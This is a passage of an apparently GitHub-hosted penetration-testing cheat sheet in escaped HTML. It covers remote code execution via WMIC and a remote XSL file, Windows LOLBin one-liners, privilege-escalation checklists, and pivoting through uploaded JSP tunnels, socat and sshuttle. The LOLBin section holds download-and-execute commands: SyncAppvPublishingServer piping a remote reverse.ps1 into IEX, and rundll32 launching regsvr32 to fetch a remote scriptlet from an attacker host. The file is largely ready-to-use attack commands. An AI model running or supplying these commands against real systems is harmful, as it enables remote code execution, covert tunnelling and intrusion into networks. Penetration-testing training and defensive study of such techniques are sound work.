+&lt;p&gt;&lt;a name="user-content-rcewmic"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content-rce-via-wmic" class="anchor" aria-hidden="true" href="#rce-via-wmic"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;RCE via WMIC&lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;Powershell without powershell:&lt;/p&gt;
+&lt;p&gt;Generate payload with web_delivery&lt;/p&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/40374533-8da00e10-5de9-11e8-888e-3b1eaccb28b0.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/40374533-8da00e10-5de9-11e8-888e-3b1eaccb28b0.png" alt="powershellless1" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Encode Payload&lt;/p&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/40374540-908e0ca8-5de9-11e8-9002-5f03193b10a5.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/40374540-908e0ca8-5de9-11e8-9002-5f03193b10a5.png" alt="powershellless2" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Include payload in xsl file&lt;/p&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/40374546-92dcda84-5de9-11e8-99c8-9066ae129644.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/40374546-92dcda84-5de9-11e8-99c8-9066ae129644.png" alt="powershellless3" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;wmic process get brief /format:"https://raw.githubusercontent.com/adon90/pentest_compilation/master/nops.xsl"&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/40375266-73770028-5deb-11e8-92da-952692727bec.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/40375266-73770028-5deb-11e8-92da-952692727bec.png" alt="powershellless4" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-lolbins"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content-lolbins" class="anchor" aria-hidden="true" href="#lolbins"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;LOLBINS&lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt;SyncAppvPublishingServer&lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt;SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://192.168.48.129:8000/reverse.ps1') | IEX"&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/40776727-ee904d00-64cb-11e8-8921-407581b13edf.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/40776727-ee904d00-64cb-11e8-8921-407581b13edf.png" alt="lolbin1" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt;rundll32&lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt;rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("regsvr32 /s /n /u /i:http://192.168.48.130:8080/bhRxgASz0.sct scrobj.dll")&lt;/pre&gt;
+&lt;p&gt;&lt;a name="user-content-privesc"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;&lt;a id="user-content--privilege-escalation" class="anchor" aria-hidden="true" href="#-privilege-escalation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Privilege Escalation&lt;/h2&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-linux"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content--linux-privilege-escalation-" class="anchor" aria-hidden="true" href="#-linux-privilege-escalation-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Linux Privilege Escalation &lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;sudo -l&lt;/li&gt;
+&lt;li&gt;Kernel Exploits&lt;/li&gt;
+&lt;li&gt;OS Exploits&lt;/li&gt;
+&lt;li&gt;Password reuse (mysql, .bash_history, 000-default.conf...)&lt;/li&gt;
+&lt;li&gt;Known binaries with suid flag and interactive (nmap)&lt;/li&gt;
+&lt;li&gt;Custom binaries with suid flag either using other binaries or with command execution&lt;/li&gt;
+&lt;li&gt;Writable files owned by root that get executed (cronjobs)&lt;/li&gt;
+&lt;li&gt;MySQL as root&lt;/li&gt;
+&lt;li&gt;Vulnerable services (chkrootkit, logrotate)&lt;/li&gt;
+&lt;li&gt;Writable /etc/passwd&lt;/li&gt;
+&lt;li&gt;Readable .bash_history&lt;/li&gt;
+&lt;li&gt;SSH private key&lt;/li&gt;
+&lt;li&gt;Listening ports on localhost&lt;/li&gt;
+&lt;li&gt;/etc/fstab&lt;/li&gt;
+&lt;li&gt;/etc/exports&lt;/li&gt;
+&lt;li&gt;/var/mail&lt;/li&gt;
+&lt;li&gt;Process as other user (root) executing something you have permissions to modify&lt;/li&gt;
+&lt;li&gt;SSH public key + Predictable PRNG&lt;/li&gt;
+&lt;li&gt;apt update hooking (Pre-Invoke)&lt;/li&gt;
+&lt;li&gt;Capabilities&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a name="user-content-windows"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content--windows-privilege-escalation-" class="anchor" aria-hidden="true" href="#-windows-privilege-escalation-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Windows Privilege Escalation &lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Kernel Exploits&lt;/li&gt;
+&lt;li&gt;OS Exploits&lt;/li&gt;
+&lt;li&gt;Pass The Hash&lt;/li&gt;
+&lt;li&gt;Password reuse&lt;/li&gt;
+&lt;li&gt;DLL hijacking (Path)&lt;/li&gt;
+&lt;li&gt;Vulnerable services&lt;/li&gt;
+&lt;li&gt;Writable services binaries path&lt;/li&gt;
+&lt;li&gt;Unquoted services&lt;/li&gt;
+&lt;li&gt;Listening ports on localhost&lt;/li&gt;
+&lt;li&gt;Registry keys&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a name="user-content-kernel"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content--kernel-exploits-" class="anchor" aria-hidden="true" href="#-kernel-exploits-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Kernel Exploits &lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;Linux: &lt;a href="https://github.com/lucyoa/kernel-exploits"&gt;https://github.com/lucyoa/kernel-exploits&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Windows: &lt;a href="https://github.com/abatchy17/WindowsExploits"&gt;https://github.com/abatchy17/WindowsExploits&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-tunneling"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;&lt;a id="user-content-tunneling--port-forwarding" class="anchor" aria-hidden="true" href="#tunneling--port-forwarding"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Tunneling &amp;amp; Port Forwarding&lt;/h2&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-sshovertcp"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content-ssh-over-http-squid" class="anchor" aria-hidden="true" href="#ssh-over-http-squid"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SSH over HTTP (Squid)&lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; socat &lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt;socat TCP-L:9999,fork,reuseaddr PROXY:192.168.1.41:127.0.0.1:22,proxyport=3128
+
+ssh john@127.0.0.1 -p 9999&lt;/pre&gt;
+&lt;p&gt;&lt;b&gt;proxytunnel &lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt;proxytunnel -p 192.168.1.41:3128 -d 127.0.0.1:22 -a 5555
+
+ssh john@127.0.0.1 -p 5555&lt;/pre&gt;
+&lt;p&gt;&lt;b&gt;proxychains &lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt;http 192.168.1.41 3128
+
+proxychains ssh john@127.0.0.1&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/33822522-1e15dbee-de58-11e7-9953-3da8ff684cfc.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/33822522-1e15dbee-de58-11e7-9953-3da8ff684cfc.png" alt="proxychains" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt;corkscrew &lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt;ssh john@192.168.1.41 -t /bin/sh&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/33822672-b92a51f0-de58-11e7-9936-06056b7903b8.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/33822672-b92a51f0-de58-11e7-9936-06056b7903b8.png" alt="cork" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-tcpoverhttp"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content--tcp-over-http-" class="anchor" aria-hidden="true" href="#-tcp-over-http-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; TCP over HTTP &lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;For this technique, it is necessary to be able to upload a file to a webserver.&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-regeorg"&gt;&lt;b&gt; 1. reGeorg &lt;/b&gt;&lt;/a&gt;&lt;/p&gt;&lt;a name="user-content-regeorg"&gt;
+&lt;p&gt;File upload to the server correct&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/33883424-028c9f0e-df3c-11e7-9559-b35667ae76db.png" alt="regeorge2" style="max-width:100%;"&gt;&lt;/p&gt;
+&lt;p&gt;Tunnel creation&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;python reGeorgSocksProxy.py -p 5555 -u "http://&amp;lt;ip&amp;gt;/admin/uploads/reGeorg.jsp"&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Proxychains config&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/33883419-fcc15416-df3b-11e7-89a9-499ffc1de9cf.png" alt="regeorge1" style="max-width:100%;"&gt;&lt;/p&gt;
+  &lt;pre&gt;proxychains nmap -F -sT 127.0.0.1
+proxychains mysql -u root -p -h 127.0.0.1
+proxychains ssh localhost
+&lt;/pre&gt;
+&lt;p&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/33883422-017021fe-df3c-11e7-8f99-f02de5084c02.png" alt="regeorge3" style="max-width:100%;"&gt;&lt;/p&gt;
+&lt;/a&gt;&lt;p&gt;&lt;a name="user-content-regeorg"&gt;Reference: &lt;/a&gt;&lt;a href="https://sensepost.com/discover/tools/reGeorg/" rel="nofollow"&gt;https://sensepost.com/discover/tools/reGeorg/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-abptts"&gt;&lt;b&gt; 2. ABBTTS &lt;/b&gt;&lt;/a&gt;&lt;/p&gt;&lt;a name="user-content-abptts"&gt;
+&lt;p&gt;Upload File&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/33883774-6d249ffa-df3d-11e7-9f3f-68bf1e70465f.png" alt="abbtts5" style="max-width:100%;"&gt;&lt;/p&gt;
+&lt;p&gt;Config proxychains and create the tunnel&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;python abpttsclient.py -c tomcat_walkthrough/config.txt -u http://192.168.1.128/abptts.jsp -f 127.0.0.1:22222/127.0.0.1:22&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Usage&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ssh -p 22222 user@127.0.0.1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/33883891-dc2f3c70-df3d-11e7-84e9-ebd9eab9ebee.png" alt="abbtts7" style="max-width:100%;"&gt;&lt;/p&gt;
+&lt;/a&gt;&lt;p&gt;&lt;a name="user-content-abptts"&gt;Reference: &lt;/a&gt;&lt;a href="https://github.com/nccgroup/ABPTTS"&gt;https://github.com/nccgroup/ABPTTS&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-httpredirectors"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content-http-redirectors" class="anchor" aria-hidden="true" href="#http-redirectors"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;a name="user-content-httpredirectors"&gt;HTTP Redirectors&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;/p&gt;&lt;a name="user-content-httpredirectors"&gt;
+&lt;/a&gt;&lt;p&gt;&lt;a name="user-content-httpredirectors"&gt;&lt;/a&gt;&lt;a name="user-content-socatred"&gt;&lt;b&gt; 1. socat &lt;/b&gt;&lt;/a&gt;&lt;/p&gt;&lt;a name="user-content-socatred"&gt;
+&lt;pre&gt;socat TCP4-LISTEN:80,fork TCP4:REMOTE-HOST-IP-ADDRESS:80&lt;/pre&gt;
+&lt;p&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/42031184-a8b3deee-7ad5-11e8-96ae-9b38bfe82df2.png" alt="socatt" style="max-width:100%;"&gt;&lt;/p&gt;
+&lt;/a&gt;&lt;p&gt;&lt;a name="user-content-socatred"&gt;&lt;/a&gt;&lt;a name="user-content-iptablesred"&gt;&lt;b&gt; 2. iptables &lt;/b&gt;&lt;/a&gt;&lt;/p&gt;&lt;a name="user-content-iptablesred"&gt;
+&lt;pre&gt;iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination REMOTEADDR:80
+iptables -t nat -A POSTROUTING -j MASQUERADE
+iptables -I FORWARD -j ACCEPT
+iptables -P FORWARD ACCEPT
+sysctl net.ipv4.ip_forward=1&lt;/pre&gt;
+&lt;p&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/41294963-97cc925c-6e59-11e8-8adf-8db85f6ffaf2.png" alt="iptables" style="max-width:100%;"&gt;&lt;/p&gt;
+&lt;/a&gt;&lt;p&gt;&lt;a name="user-content-iptablesred"&gt;&lt;/a&gt;&lt;a name="user-content-windowsocks"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content--windows-socks-proxy-" class="anchor" aria-hidden="true" href="#-windows-socks-proxy-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Windows Socks Proxy &lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;In this case this is going to be used to access Burp listening on a Windows NATed VM from other PCs in the same network as the Windows Host.&lt;/p&gt;
+&lt;p&gt;From the Windows Host machine (IP: 192.168.1.206)&lt;/p&gt;
+&lt;pre&gt;Import-Module .\Invoke-SocksProxy.psm1
+Invoke-SocksProxy -bindPort 1234
+&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/49870467-b63bb480-fe13-11e8-807d-8422e5837b58.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/49870467-b63bb480-fe13-11e8-807d-8422e5837b58.png" alt="invokesocks" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;From other PC on the Windows Host machine network (IP: 192.168.1.69)&lt;/p&gt;
+&lt;p&gt;Configure &lt;code&gt;proxychains.conf&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt; socks4 	192.168.1.206 1234 &lt;/pre&gt;
+&lt;pre&gt;proxychains socat TCP-LISTEN:8081,fork,reuseaddr TCP:192.168.48.158:8080&lt;/pre&gt;
+&lt;p&gt;This command ahead makes Burp (which is listening on the NATed machine) accessible from 192.168.1.69 on port 8081&lt;/p&gt;
+&lt;p&gt;Now, configure the Proxy in the browser:&lt;/p&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/49870450-aae88900-fe13-11e8-8c95-4208f20cd8ec.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/49870450-aae88900-fe13-11e8-8c95-4208f20cd8ec.png" alt="proxyconf" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;All the traffic is logged on the NATed machine Burp.&lt;/p&gt;
+&lt;p&gt;Reference: &lt;a href="https://github.com/p3nt4/Invoke-SocksProxy"&gt;https://github.com/p3nt4/Invoke-SocksProxy&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-poor"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content--mans-poor-vpn-" class="anchor" aria-hidden="true" href="#-mans-poor-vpn-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Man's Poor VPN &lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;Traffic forward over SSH without needing to &lt;code&gt;ssh -D &amp;lt;port&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;sshuttle -vr user@192.168.207.57 1X0.1X.0.0/16&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/42047219-02a13b70-7b00-11e8-9686-8bf2f44bee81.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/42047219-02a13b70-7b00-11e8-9686-8bf2f44bee81.png" alt="sshuttle" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Proof:&lt;/p&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/34785499-a0e7d838-f631-11e7-869f-d6fcdc1051e9.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/34785499-a0e7d838-f631-11e7-869f-d6fcdc1051e9.png" alt="mantis2" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Reference: &lt;a href="http://teohm.com/blog/using-sshuttle-in-daily-work/" rel="nofollow"&gt;http://teohm.com/blog/using-sshuttle-in-daily-work/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-windowsad"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;&lt;a id="user-content--windows-ad-environment-" class="anchor" aria-hidden="true" href="#-windows-ad-environment-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Windows AD Environment &lt;/h2&gt;&lt;p&gt;&lt;/p&gt;
